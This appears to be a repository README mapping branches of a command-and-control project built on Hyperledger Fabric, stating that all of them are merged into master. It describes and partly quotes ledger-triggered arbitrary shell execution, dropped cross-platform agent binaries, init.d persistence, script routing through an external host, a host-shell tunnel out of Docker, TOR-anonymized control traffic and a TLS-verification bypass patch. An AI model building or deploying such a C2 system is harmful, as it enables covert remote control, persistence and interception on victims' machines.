# Branch map

This diagram shows how the project's branches relate to `master` and to each
other. All branches have now been **merged into `master`**, which carries the
full remote-access / command-and-control (C2) capability built over the base
single-organization Hyperledger Fabric network template: the shell agent
feature line, the TOR peer mapping, and the host shell tunnel.

```mermaid
flowchart TD
    master["master<br/><i>Fabric network + C2 agent line (all merged)</i>"]

    %% Merged back into master
    ca["ca/storage<br/><i>CA administrator certificate</i>"]
    installer["installer<br/><i>chaincode installer REST API</i>"]
    standalone["chaincode/standalone<br/><i>standalone chaincode</i>"]
    ssh["ssh-stream<br/><i>shell-stream tunnel</i>"]
    tor["peer/tor<br/><i>TOR peer mapping</i>"]
    ca -. merged .-> master
    installer -. merged .-> master
    standalone -. merged .-> master
    ssh -. merged .-> master
    tor -. merged .-> master

    %% Shell agent mainline, also merged
    dbus["chaincode/shell-dbus<br/><i>shell chaincode + D-Bus / systray</i>"]
    shell["chaincode/shell<br/><i>merges shell-dbus, test scaffolding</i>"]
    cross["chaincode/shell-crossplatform<br/><i>Linux / Win / macOS / Android / RPi agents</i>"]
    tok["chaincode/shell-tokenizer<br/><i>tokenizer, init.d daemon, 2nd peer</i>"]
    tls["chaincode/tls<br/><i>TLS peer + nginx proxy (tip)</i>"]
    dbus --> shell --> cross --> tok --> tls
    tls -. merged .-> master

    classDef merged fill:#b7e1a1,stroke:#2e7d32,stroke-width:2px,color:#102a12;
    classDef tip fill:#ffc48a,stroke:#e06c00,stroke-width:2px,color:#3d2200;
    class ca,installer,standalone,ssh,tor,dbus,shell,cross,tok merged;
    class tls tip;
```

## Legend

- **Green (dashed)** — branches merged into `master`.
- **Orange** — `chaincode/tls`, the tip of the mainline (most complete).

## Lineage summary

- Mainline: `master -> shell-dbus -> shell -> shell-crossplatform -> shell-tokenizer -> tls`.
- Side branches off `master`: `ssh-stream`, `peer/tor`.
- Merged into `master`: every branch above (all merged; `peer/tor` and
  `ssh-stream` required conflict resolution in `start.sh` /
  `docker-compose.yml`, keeping the current topology and adding the
  `peer0.org1.example.onion` and `host-shell0.org1.example.com` containers).

## Why they were originally left unmerged

The branches below were intentionally held out of `master` while they were
still exploratory. Individually some pieces are dual-use; taken together they
form a working remote-access / command-and-control (C2) system delivered over
Hyperledger Fabric: arbitrary remote command execution, anonymized transport,
certificate-verification bypass, self-installing cross-platform persistence,
and script obfuscation. Each entry records the specific reason it was
considered "offensive" rather than base-template material.

### `chaincode/shell-dbus`, `chaincode/shell` — ledger-driven command execution

The shell chaincode's `Invoke` takes a command out of the ledger transaction and
runs it on the host shell:

```go
// chaincodes/shell-linux-dbus/shell.go
cmd := exec.Command("bash", "-c", command)   // executes arbitrary attacker-supplied input
```

Anyone able to submit a transaction to the channel gains arbitrary command
execution on every node running the agent. The D-Bus/systray additions only
surface a desktop notification while a remote command runs. **Reason: remote
code execution by design — this is the core offensive capability.**

### `chaincode/shell-crossplatform` — packaged cross-platform agents

Rebuilds the shell agent as prebuilt binaries committed to the repo for Linux,
Linux-DBus, Windows (`.exe`), macOS, Android and Raspberry Pi
(`chaincodes/shell-*/shell-*`). **Reason: turns the RCE chaincode into a
ready-to-drop, multi-platform agent; the checked-in opaque binaries are also
unreviewable.**

### `chaincode/shell-tokenizer` — persistence + obfuscation + external endpoint

Builds on the agents with three additional traits:

- **Persistence.** `start.tpl.sh` is an `### BEGIN INIT INFO ###` init.d service
  that installs the agent as a boot-time daemon which loads its target
  `PEER_ADDRESS`/`CHAINCODE_ID_NAME` from the environment and auto-reconnects.
- **Obfuscation + external call-out.** `Invoke` now runs commands through
  `exec.Command("./eval.sh", command)`, and the template exports
  `TOKENIZER_ENDPOINT=http://softethica.com:3007/keyChain/password`, routing
  script content through an external third-party endpoint.
- Ships a `tokenizer` binary for every platform and checked-in
  `configtxgen`/`cryptogen` binaries.

**Reason: adds boot persistence, script obfuscation, and an external network
dependency on top of the RCE agent.**

### `ssh-stream` — host shell tunnel

Adds a `host-shell0.org1.example.com` container (`vitche/docker-host-shell-tunnel`)
and `tunnel.sh`/`worker.sh` that bind-mount FIFOs
(`/tmp/docker-host-shell-tunnel-{input,output}.fifo`) from the host into the
container and pipe a host shell through a chaincode. **Reason: provides an
interactive shell tunnel from the ledger to the Docker host, breaking container
isolation.**

### `peer/tor` — anonymized transport

Adds a `peer0.org1.example.onion` container (`vitche/docker-tor-mapping`) that
re-exposes peer ports 7052/7053 over TOR. **Reason: anonymizes the agent's
command/control channel; legitimate for privacy research, but combined with the
shell agent it is the covert transport for a C2.**

### `chaincode/tls` — certificate-verification bypass

The branch's own `documentation/chaincode-tls.md` instructs patching the Fabric
shim to disable verification:

```diff
 return credentials.NewTLS(&tls.Config{
+    InsecureSkipVerify: true,
     Certificates: []tls.Certificate{cert},
```

It pairs this with an nginx `stream {}` TLS-terminating proxy
(`nginx/nginx.conf`) in front of a second peer. **Reason: deliberately defeats
TLS certificate validation (enabling undetected man-in-the-middle).**

## Tests

Unit tests cover the pure Go chaincode logic of every chaincode module,
compiled against a small local shim double under `chaincodes/testshim/`
(the Fabric 1.4 shim predates Go modules; the `go.mod` files under
`chaincodes/*/` are test-only and ignored by the real GOPATH-mode chaincode
build):

- `chaincodes/standalone/` — `Init` success, `Invoke` echo of the function name.
- `chaincodes/sample/` — same contract for the `Sample` chaincode.
- `chaincodes/shell-linux/` — command execution through `./eval.sh` +
  `./tokenizer` (stdout and stderr captured into the JSON response), ledger
  persistence via `PutState`, and the `shim.Error` path when `eval.sh` is
  missing.
- `chaincodes/shell-stream/` — unknown-function path (`ERROR_UNKNOWN`) and the
  `eval` tunnel round-trip against a local TCP listener emulating the FIFO
  tunnel endpoint (including `:)` terminator stripping).

Run them all in Docker:

```sh
./test.sh units
```

Not covered by unit tests (integration/smoke territory, not logic): the
docker-compose topology, TOR and nginx proxy containers, the D-Bus/systray
variant (`chaincodes/shell-linux-dbus/`, requires a D-Bus session and cgo
system libraries), and the FIFO host-shell tunnel.
